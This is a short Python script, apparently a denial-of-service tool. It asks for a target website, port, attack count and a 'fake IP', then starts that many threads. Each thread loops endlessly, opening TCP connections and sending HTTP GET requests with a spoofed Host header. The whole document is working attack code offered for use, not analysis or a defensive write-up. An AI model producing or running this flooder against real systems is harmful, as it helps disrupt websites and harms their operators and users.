from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread

fake_ip = input("Fake IP address: ")
target = input("Target website: ")
port = int(input("Target Port: "))
attack_count = int(input("Amount of attacks: "))

get = "GET /" + target + " HTTP/1.1\r\n"
host = "Host: " + fake_ip + "\r\n\r\n"

def attack(count):
    while True:
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((target, port))
            s.sendto((get).encode('ascii'),(target, port))
            s.sendto((host).encode('ascii'),(target, port))
            s.close()
            print("Successfull: " + count)
        except ConnectionRefusedError:
            print("Server Error: " + count)


for i in range(attack_count):
    thread = Thread(target=attack, args=str(i))
    thread.start()
